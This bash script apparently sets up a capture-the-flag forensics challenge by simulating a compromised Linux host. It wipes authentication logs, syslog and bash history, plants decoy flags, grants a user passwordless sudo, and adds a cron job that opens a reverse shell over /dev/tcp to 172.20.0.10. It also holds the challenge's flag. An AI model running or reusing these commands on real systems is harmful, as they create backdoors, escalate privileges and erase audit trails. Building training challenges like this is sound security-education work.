#!/bin/bash

# Attacker clears their traces in log files
echo '' > /var/log/auth.log
cat /dev/null > /var/log/wtmp
cat /dev/null > /var/log/btmp
cat /dev/null > /var/log/lastlog

# Attacker hides decoy clues in file metadata and extended attributes
echo "Nothing to see here." > /home/bob/notes.txt
setfattr -n user.note -v "This is the flag: https://www.youtube.com/watch?v=dQw4w9WgXcQ" /home/bob/notes.txt

echo "Create a new PR with a new challenge for stratocyberlab." > /home/charlie/todo.txt
setfattr -n user.note -v "Or this is the flag? https://www.youtube.com/watch?v=dQw4w9WgXcQ" /home/charlie/todo.txt

# Attacker leaves a process running for fun
nohup sleep 100000 &

# Create the real malicious actions (creating reverse shell in charlies' crontab and add charlie to sudoers)
echo 'charlie ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
su charlie -c "
(crontab -l; echo '# Leave me here! OFL{9xCyoIOLhJgFkx6Bd62NNhLPyvaMp0PLnlZwSFq5BHccDkKCGLgT9uNnOwwW}') | crontab -;
(crontab -l; echo '*/5 * * * * /bin/bash -c \"/bin/bash -i >& /dev/tcp/172.20.0.10/678 0>&1\"') | crontab -;
"

# Attacker modifies system logs to hide cron job (simulated)
echo "" > /var/log/syslog

# Attacker leaves a decoy message in logs
echo "You almost found it https://www.youtube.com/watch?v=dQw4w9WgXcQ" >> /var/log/.hidden_log

# Attacker cleans up bash history
unset HISTFILE
rm /root/.bash_history
history -c
